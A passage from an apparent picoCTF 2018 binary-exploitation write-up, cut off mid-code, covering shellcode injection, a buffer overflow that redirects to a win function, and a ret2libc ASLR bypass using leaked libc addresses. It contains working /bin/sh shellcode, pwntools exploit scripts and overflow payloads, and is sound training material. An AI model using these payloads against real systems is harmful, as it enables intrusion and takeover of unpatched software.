<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python -c <span style=color:#f1fa8c>&#39;sc = &#34;\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68&#34;; print sc&#39;</span> &gt; sc.bin

cat sc.bin - | ./vuln
</code></pre></td></tr></table>
</div>
</div><p>Note that the shell will close immediately, so we have to keep it waiting for stdin by adding a <code>-</code> sign at the end of the cat command</p>
<p>Another way is to use pwnlib.shellcraft function:</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#ff79c6>from</span> pwn <span style=color:#ff79c6>import</span> <span style=color:#ff79c6>*</span>
<span style=color:#ff79c6>from</span> os.path <span style=color:#ff79c6>import</span> join

DEV<span style=color:#ff79c6>=</span><span style=color:#bd93f9>0</span>

context(arch<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;i386&#39;</span>, os<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;linux&#39;</span>, bits <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;32&#39;</span>)

REMOTE_PATH<span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;/problems/shellcode_0_48532ce5a1829a772b64e4da6fa58eed&#39;</span>
LOCAL_PATH<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;.&#39;</span>
PRGM <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;vuln&#39;</span>
h, u <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;2018shell.picoctf.com&#39;</span>, <span style=color:#f1fa8c>&#39;0xade1&#39;</span>

<span style=color:#ff79c6>if</span> DEV:
  p <span style=color:#ff79c6>=</span> process(join(LOCAL_PATH, PRGM))
<span style=color:#ff79c6>else</span>:
  s <span style=color:#ff79c6>=</span> ssh(host<span style=color:#ff79c6>=</span>h, user<span style=color:#ff79c6>=</span>u)
  p <span style=color:#ff79c6>=</span> s<span style=color:#ff79c6>.</span>process(argv<span style=color:#ff79c6>=</span>join(REMOTE_PATH,PRGM), cwd<span style=color:#ff79c6>=</span>REMOTE_PATH)

sc <span style=color:#ff79c6>=</span> pwnlib<span style=color:#ff79c6>.</span>shellcraft<span style=color:#ff79c6>.</span>i386<span style=color:#ff79c6>.</span>sh()
payload <span style=color:#ff79c6>=</span> asm(sc)
<span style=color:#6272a4>#payload = &#34;\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68&#34;</span>

p<span style=color:#ff79c6>.</span>sendlineafter(<span style=color:#f1fa8c>&#39;Enter a string!</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>, payload)
p<span style=color:#ff79c6>.</span>interactive()
</code></pre></td></tr></table>
</div>
</div><h2 id=buffer-overflow-2>buffer-overflow-2</h2>
<ul>
<li>source: <a href=./resources/buffer-overflow-2/vuln.c>vuln.c</a></li>
<li>binary: <a href=./resources/buffer-overflow-2/vuln>vuln</a></li>
</ul>
<p>The win function will show us the flag if called with two specific arguments arg1=0xDEADBEEF and arg2=0xDEADC0DE</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#8be9fd>void</span> <span style=color:#50fa7b>win</span>(<span style=color:#8be9fd>unsigned</span> <span style=color:#8be9fd>int</span> arg1, <span style=color:#8be9fd>unsigned</span> <span style=color:#8be9fd>int</span> arg2) {
  [..]
  <span style=color:#ff79c6>if</span> (arg1 <span style=color:#ff79c6>!=</span> <span style=color:#bd93f9>0xDEADBEEF</span>)
    <span style=color:#ff79c6>return</span>;
  <span style=color:#ff79c6>if</span> (arg2 <span style=color:#ff79c6>!=</span> <span style=color:#bd93f9>0xDEADC0DE</span>)
    <span style=color:#ff79c6>return</span>;
  <span style=color:#6272a4>/* print the flag here */</span>
}
</code></pre></td></tr></table>
</div>
</div><p>We can use objdump or readelf to find the address of the win function.</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>readelf -s vuln | grep win
    66: 080485cb   <span style=color:#bd93f9>123</span> FUNC    GLOBAL DEFAULT   <span style=color:#bd93f9>14</span> win
</code></pre></td></tr></table>
</div>
</div><p>Now we can build a stack representation of the win function desired state:</p>
<pre><code>+---------------------------+
|       0xDEADC0DE          |   arg2
+---------------------------+
|       0xDEADBEEF          |   arg1
+---------------------------+
|       0x????????          |   old ebp
+---------------------------+
|       0x080485CB          |   return address (win function)
+---------------------------+
</code></pre>
<p>Using python, we can simply use pwn to print little endian addresses representation:</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#ff79c6>import</span> pwn
pwn<span style=color:#ff79c6>.</span>p32(<span style=color:#bd93f9>0x080485cb</span>) <span style=color:#6272a4># &#39;\xcb\x85\x04\x08&#39;</span>
pwn<span style=color:#ff79c6>.</span>p32(<span style=color:#bd93f9>0xDEADBEEF</span>) <span style=color:#6272a4># &#39;\xef\xbe\xad\xde&#39;</span>
pwn<span style=color:#ff79c6>.</span>p32(<span style=color:#bd93f9>0xDEADC0DE</span>) <span style=color:#6272a4># &#39;\xde\xc0\xad\xde&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>The function vuln being vulnerable to buffer overflow, we can now craft a payload:</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>python <span style=color:#ff79c6>-</span>c <span style=color:#f1fa8c>&#34;print &#39;A&#39;*112 + &#39;</span><span style=color:#f1fa8c>\xcb\x85\x04\x08</span><span style=color:#f1fa8c>&#39; + &#39;BBBB&#39; + &#39;</span><span style=color:#f1fa8c>\xef\xbe\xad\xde</span><span style=color:#f1fa8c>&#39; + &#39;</span><span style=color:#f1fa8c>\xde\xc0\xad\xde</span><span style=color:#f1fa8c>&#39;&#34;</span>  <span style=color:#ff79c6>|</span> <span style=color:#ff79c6>./</span>vuln
</code></pre></td></tr></table>
</div>
</div><h2 id=got-2-learn-libc>got-2-learn-libc</h2>
<ul>
<li>source: <a href=./resources/got-2-learn-libc/vuln.c>vuln.c</a></li>
<li>binary: <a href=./resources/got-2-learn-libc/vuln.c>vuln</a></li>
</ul>
<h3 id=spotting-the-buffer-overflow-and-attack-path>Spotting the buffer-overflow and attack path</h3>
<p>The vuln function is vulnerable to buffer-overflow attack.</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#8be9fd>char</span> buf[BUFSIZE];
puts(<span style=color:#f1fa8c>&#34;Enter a string:&#34;</span>);
gets(buf);
puts(buf);}
</code></pre></td></tr></table>
</div>
</div><p>The issue with this binary is ASLR being activated. Exploitation of ASLR is possible if we can leak some addresses (e.g format-string &mldr;)</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>checksec vuln
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> <span style=color:#f1fa8c>&#39;/home/ctf/ctf_writeups/picoCTF2018/binary-exploitation/resources/got-2-learn-libc/vuln&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled	&lt;--	ASLR is activated <span style=color:#ff79c6>(</span><span style=color:#8be9fd;font-style:italic>PIE</span><span style=color:#ff79c6>=</span>Position Independent Executable<span style=color:#ff79c6>)</span>
</code></pre></td></tr></table>
</div>
</div><p>The program kindly show us at runtime the memory address of the <code>useful_string[16] = "/bin/sh"</code> as well as some other libc function (e.g puts, fflush &mldr;).
So instead of looking for a format-string, we can capture those addresses at runtime with pwntools and performed some simple arithmetic to deduct libc system() adresses</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>Here are some useful addresses:

puts: 0xf7de0360
fflush 0xf7dde500
read: 0xf7e5e620
write: 0xf7e5e6f0
useful_string: 0x5655f030

Enter a string:
^C
</code></pre></td></tr></table>
</div>
</div><p>Note: The addresses will change between runs due to ASLR. It is possible to disable ASLR locally with the command: <code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code>, but we can&rsquo;t do it on the remote machine.</p>
<p>Being provided the libc functions addresses at runtime, we can guess the libc version in use, its base address and deduct the ASLR offset. Once the offset obtained, we can guess the <code>system()</code> function address as part of a buffer-overflow attack to invoke the useful_string <code>/bin/sh</code></p>
<h3 id=guessing-the-libc-version>Guessing the libc version</h3>
<p>To find the system function address: we first need to guess libc version.</p>
<h4 id=using-ldd>Using ldd</h4>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ldd vuln
    libc.so.6 <span style=color:#ff79c6>=</span>&gt; /lib32/libc.so.6 <span style=color:#ff79c6>(</span>0xf7ddc000<span style=color:#ff79c6>)</span>
ls -la /lib32/libc.so.6
    lrwxrwxrwx <span style=color:#bd93f9>1</span> root root <span style=color:#bd93f9>12</span> Apr <span style=color:#bd93f9>16</span>  <span style=color:#bd93f9>2018</span> /lib32/libc.so.6 -&gt; libc-2.27.so
</code></pre></td></tr></table>
</div>
</div><p>On the remote, the same operation shows we are using libc-2.23.so</p>
<h4 id=using-libc-database>using libc-database</h4>
<p>The above operation could have been performed using <a href=https://github.com/niklasb/libc-database>libc-database</a></p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>git clone https://github.com/niklasb/libc-database
<span style=color:#8be9fd;font-style:italic>cd</span> libc-database
<span style=color:#6272a4>#download all libc versions (it takes a while, so you can cancel download or old archived versions)</span>
./get
<span style=color:#6272a4># find local libc version by passing the 3 last digits of leaked libc functions&#39; addresses</span>
./find fflush <span style=color:#bd93f9>500</span> <span style=color:#8be9fd;font-style:italic>read</span> <span style=color:#bd93f9>620</span>
http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6-i386_2.27-3ubuntu1_amd64.deb <span style=color:#ff79c6>(</span>id libc6-i386_2.27-3ubuntu1_amd64<span style=color:#ff79c6>)</span>
<span style=color:#6272a4># repeat the operation on the server</span>
</code></pre></td></tr></table>
</div>
</div><p>local version: libc6-i386_2.27-3ubuntu1_amd64
remote version: libc6-i386_2.23-0ubuntu10_amd64</p>
<h3 id=establish-the-libc_base-address-and-system-function-offset>Establish the libc_base address and system function offset</h3>
<p>We establish the libc base address (prior ASLR offset) with this simple equation:
** libc_base = runtime_address_of_func - symbol_address_of_func **</p>
<h4 id=using-libc-database-1>using libc-database</h4>
<p>We already have the runtime address of the <code>write</code> function from the program output (0xf7e5e6f0), we can use libc-database to get the symbol address:</p>
<ol>
<li>Finding libc_base</li>
</ol>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>./dump libc6-i386_2.27-3ubuntu1_amd64 write
<span style=color:#8be9fd;font-style:italic>offset_write</span> <span style=color:#ff79c6>=</span> 0x000e56f0
./dump libc6-i386_2.27-3ubuntu1_amd64 puts
<span style=color:#8be9fd;font-style:italic>offset_puts</span> <span style=color:#ff79c6>=</span> 0x00067360
</code></pre></td></tr></table>
</div>
</div><p>Therefore:</p>
<ul>
<li>locally: libc_base = 0xf7e5e6f0 - 0x000e56f0 = 0xf7de0360 - 0x00067360 = 0xf7d79000</li>
<li>remotely: libc_base = 0xf76d9350 (read) - 0x000d4350 (offset_read) = 0xf7605000</li>
</ul>
<p>Note: It&rsquo;s usually a good sign that the result is 4K aligned.</p>
<ol start=2>
<li>Finding system address</li>
</ol>
<p>We calculate the address of the <code>system()</code> function:</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#6272a4># remote address of system</span>
./dump libc6-i386_2.23-0ubuntu10_amd64 system
<span style=color:#8be9fd;font-style:italic>offset_system</span> <span style=color:#ff79c6>=</span> 0x0003a940
<span style=color:#6272a4># local address of system</span>
./dump libc6-i386_2.27-3ubuntu1_amd64 system
<span style=color:#8be9fd;font-style:italic>offset_system</span> <span style=color:#ff79c6>=</span> 0x0003cd10
</code></pre></td></tr></table>
</div>
</div><p>Therefore:</p>
<ul>
<li>locally: system_addr = libc_base (0xf7d79000) + offset_system (0x0003cd10) = 0xf7db5d10</li>
<li>remotely: system_addr = libc_base (0xf7605000) + offset_system (0x0003a940) = 0xf763f940</li>
</ul>
<p>Note: the offset will always change as it is randomly set by ASLR.</p>
<h4 id=using-gdb>using gdb</h4>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#6272a4>#(gdb) x puts</span>
0xf7e3c380 &lt;puts&gt;:     0x57e58955
<span style=color:#6272a4>#(gdb) x system</span>
0xf7e126e0 &lt;system&gt;:   0x8b0cec83
</code></pre></td></tr></table>
</div>
</div><p>We know puts_addr (runtime address) which is being leaked by the program when launched</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>gdb_puts <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0xf7e3c380</span>
gdb_system <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0xf7e126e0</span>
puts_addr <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0xf7de0360</span>
offset <span style=color:#ff79c6>=</span> gdb_puts <span style=color:#ff79c6>-</span> gdb_system
system_addr <span style=color:#ff79c6>=</span> puts_addr <span style=color:#ff79c6>-</span> offset
</code></pre></td></tr></table>
</div>
</div><h4 id=much-simpler-approach-with-the-pwn-library>much simpler approach with the pwn library</h4>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#ff79c6>import</span> pwn

<span style=color:#6272a4>#Puts symbols address</span>
